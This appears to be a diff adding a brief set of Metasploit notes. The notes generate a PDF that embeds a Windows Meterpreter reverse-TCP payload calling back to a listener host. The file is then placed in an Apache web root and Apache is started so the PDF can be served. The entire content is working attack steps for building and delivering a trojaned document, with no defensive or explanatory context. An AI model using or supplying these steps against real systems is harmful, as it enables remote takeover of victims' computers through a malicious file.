@@ -1,0 +1,14 @@
+sudo msfconsole
+-------------------------------------------------------
+use exploit/windows/fileformat/adobe_pdf_embedded_exe
+msf > exploit (adobe_pdf_embedded_exe) > info
+msf > exploit (adobe_pdf_embedded_exe) > set payload windows/x64/meterpreter/reverse_tcp
+msf > exploit (adobe_pdf_embedded_exe) > show options
+----------------------------------------------------------
+set LHOST 192.168.100.1
+show options
+exploit
+-----------------------------------------------------------------
+mv /root/.msf4/local/evil.pdf /var/www/html/evil.pdf
+sudo systemctl start apache2.service
+sudo systemctl status apache2.service
